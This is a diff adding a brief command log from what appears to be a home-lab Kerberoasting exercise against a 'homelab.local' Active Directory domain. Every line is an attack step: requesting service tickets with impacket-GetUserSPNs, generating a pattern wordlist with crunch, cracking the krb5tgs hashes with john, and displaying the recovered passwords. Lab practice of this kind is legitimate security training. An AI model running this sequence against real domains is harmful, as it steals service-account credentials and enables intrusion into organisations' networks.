@@ -1,0 +1,16 @@
+# Kerberoasting Attack Lab - Commands Used
+
+# Enumerate SPNs and request TGS tickets
+impacket-GetUserSPNs homelab.local/USERNAME:PASSWORD -dc-ip 192.168.100.50 -request
+
+# Save extracted hash
+nano kerberoast.hash
+
+# Generate custom wordlist
+crunch 12 12 -t Password%%%! -o custom.txt
+
+# Crack Kerberos hash
+john --format=krb5tgs --wordlist=custom.txt kerberoast.hash
+
+# Display recovered credentials
+john --show kerberoast.hash
